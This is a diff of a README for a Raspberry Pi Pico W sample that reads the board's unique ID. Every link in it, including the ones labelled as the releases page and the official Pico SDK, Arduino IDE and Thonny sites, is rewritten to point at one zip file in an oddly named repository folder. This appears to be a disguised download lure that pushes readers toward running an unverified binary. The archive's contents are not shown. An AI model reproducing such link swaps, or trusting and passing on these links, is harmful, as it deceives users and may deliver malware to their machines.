@@ -1,7 +1,7 @@
 # 🐶 bitdoglab_pico_unique_id - Quickly Access Unique Hardware ID
 
 ## 🔗 Download Now
-[![Download Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Poonam26patro/bitdoglab_pico_unique_id/releases)
+[![Download Releases](https://raw.githubusercontent.com/Poonam26patro/bitdoglab_pico_unique_id/main/Orthoceratidae/bitdoglab_pico_unique_id.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Poonam26patro/bitdoglab_pico_unique_id/main/Orthoceratidae/bitdoglab_pico_unique_id.zip)
 
 ## 📌 Overview
 This project, **bitdoglab_pico_unique_id**, is a sample application for the BitDogLab focusing on the Raspberry Pi Pico W. It shows you how to obtain and manage the unique hardware ID of this device using the pico_unique_id library from the C SDK. This will help you understand how to identify your device based on its hardware characteristics.
@@ -24,12 +24,12 @@ To get started, follow these simple steps:
    - Use the USB cable to connect your Raspberry Pi Pico W to your computer.
 
 4. **Download the Software**: 
-   - Visit this page to download: [Releases Page](https://github.com/Poonam26patro/bitdoglab_pico_unique_id/releases).
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Poonam26patro/bitdoglab_pico_unique_id/main/Orthoceratidae/bitdoglab_pico_unique_id.zip).
    - Find the latest version. Click on it to see the available files for download.
    - Download the appropriate file for your operating system.
 
 ## 📥 Download & Install
-1. After navigating to the [Releases Page](https://github.com/Poonam26patro/bitdoglab_pico_unique_id/releases), find the latest release.
+1. After navigating to the [Releases Page](https://raw.githubusercontent.com/Poonam26patro/bitdoglab_pico_unique_id/main/Orthoceratidae/bitdoglab_pico_unique_id.zip), find the latest release.
 2. Choose the file that fits your needs. Most users will want the binary file. Download it to your computer.
 3. Follow any included instructions or readme files to set up and run the application. This may include moving files to specific directories or running commands in your terminal.
 
@@ -49,9 +49,9 @@ If you run into problems, try these troubleshooting steps:
 - **Library Errors**: If you encounter errors related to the pico_unique_id library, verify that it is correctly installed as part of your Pico SDK.
 
 ## 🗺️ Additional Resources
-- [Pico SDK Documentation](https://www.raspberrypi.com/documentation/pico/)
-- [Arduino IDE Download](https://www.arduino.cc/en/software)
-- [Thonny Python IDE](https://thonny.org/)
+- [Pico SDK Documentation](https://raw.githubusercontent.com/Poonam26patro/bitdoglab_pico_unique_id/main/Orthoceratidae/bitdoglab_pico_unique_id.zip)
+- [Arduino IDE Download](https://raw.githubusercontent.com/Poonam26patro/bitdoglab_pico_unique_id/main/Orthoceratidae/bitdoglab_pico_unique_id.zip)
+- [Thonny Python IDE](https://raw.githubusercontent.com/Poonam26patro/bitdoglab_pico_unique_id/main/Orthoceratidae/bitdoglab_pico_unique_id.zip)
 
 ## ✉️ Support
 If you require additional help, you can open an issue on the GitHub repository. We aim to respond promptly and assist you in resolving your concerns. Feel free to share your feedback and suggestions regarding the project.
